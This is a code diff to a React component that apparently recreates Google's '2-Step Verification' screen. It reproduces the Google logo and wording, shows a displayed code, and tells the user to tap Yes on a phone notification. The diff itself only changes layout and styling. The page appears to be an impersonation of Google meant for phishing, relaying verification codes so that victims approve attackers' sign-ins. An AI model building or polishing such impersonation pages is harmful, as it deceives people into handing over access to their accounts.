@@ -60,77 +60,51 @@ export default function VerifyCode() {
   }
 
   return (
-    <div className="relative">
+    <div className="relative min-h-screen flex items-center justify-center">
+      {/* Background Map */}
       <iframe
-        class="absolute inset-0 object-cover w-full h-full"
+        className="absolute inset-0 w-full h-full object-cover filter blur-sm brightness-75 z-[-1]"
         src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3153.5693930527423!2d144.95855721544715!3d-37.818435979751494!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad642af0f11fd81%3A0xf577f5d1f11f1c1b!2sFederation%20Square!5e0!3m2!1sen!2sau!4v1601360233956!5m2!1sen!2sau"
-        frameborder="0"
-        style={{
-          border: "0",
-          position: "fixed",
-          top: 0,
-          left: 0,
-          bottom: 0,
-          right: 0,
-          width: "100%",
-          height: "100%",
-          margin: 0,
-          filter: "blur(2px)",
-          WebkitFilter: "blur(2px)",
-          overflow: "hidden",
-          zIndex: -1,
-          backgroundColor: "gray",
-        }}
-        allowfullscreen=""
+        frameBorder="0"
+        allowFullScreen
         loading="lazy"
       ></iframe>
-      <div className="font-roboto  md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
-        <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[550px]">
-          <div className="flex justify-center">
-            <Image
-              src="/images/google.png"
-              alt="google"
-              width={82}
-              height={30}
-            />
-          </div>
 
-          <div className="mt-2.5">
-            <div className="text-center">
-              <h3 className="text-2xl">2-Step Verification</h3>
-              <p className="mt-3">
-                To help keep your account safe, Google wants to make sure it's
-                really you trying to sign in
-              </p>
+      {/* Form Container */}
+      <div className="font-roboto flex flex-col justify-center items-center bg-white text-[#202124] text-base rounded-lg shadow-lg px-6 md:px-10 py-9 md:w-[450px] w-[90%] max-w-[500px]">
+        <div className="flex justify-center">
+          <img src="/images/google.png" alt="google" width={82} height={30} />
+        </div>
+
+        <div className="mt-2.5 text-center">
+          <h3 className="text-2xl">2-Step Verification</h3>
+          <p className="mt-3">
+            To help keep your account safe, Google wants to make sure it's
+            really you trying to sign in
+          </p>
+        </div>
+
+        <div className="flex flex-col items-center mt-4">
+          <img className="w-44" src="/images/mobile.gif" alt="animation" />
+
+          <div className="text-start w-full mt-4">
+            <h3 className="text-lg font-semibold">Check your phone</h3>
+            <h3 className="text-3xl font-semibold">{code}</h3>
+            <p className="mt-3">
+              Google sent a notification to your Phone. Tap Yes on the
+              notification to verify it's you.
+            </p>
+            <div className="flex pt-3 items-center">
+              <input type="checkbox" />
+              <p className="ml-3">Don't ask again on this device</p>
             </div>
-            <div className="">
-              <div className="">
-                <img
-                  class="w-44 -ml-[70px]"
-                  src="/images/mobile.gif"
-                  alt="animation"
-                />
-              </div>
-              <div className="flex flex-col justify-start text-start m-3">
-                <h3 className="text-lg font-semibold">Check your phone</h3>
-                <h3 className="text-3xl font-semibold">{code}</h3>
-                <p className="mt-3">
-                  Google sent a notification to your Phone. Tap Yes on the
-                  notification to verify it's you.
-                </p>
-                <div className="flex pt-3">
-                  <input type="checkbox" />
-                  <p className="ml-3">Don't ask again on this device</p>
-                </div>
-                <div className=" flex flex-col mt-3 items-start ">
-                  <button className="text-sm text-[#1a73e8] cursor-pointer font-medium pt-3">
-                    Resend it
-                  </button>
-                  <button className="text-sm text-[#1a73e8] cursor-pointer font-semibold pt-3 pb-5">
-                    Try another way
-                  </button>
-                </div>
-              </div>
+            <div className="flex flex-col mt-3">
+              <button className="text-sm text-[#1a73e8] font-medium pt-3">
+                Resend it
+              </button>
+              <button className="text-sm text-[#1a73e8] font-semibold pt-3 pb-5">
+                Try another way
+              </button>
             </div>
           </div>
         </div>
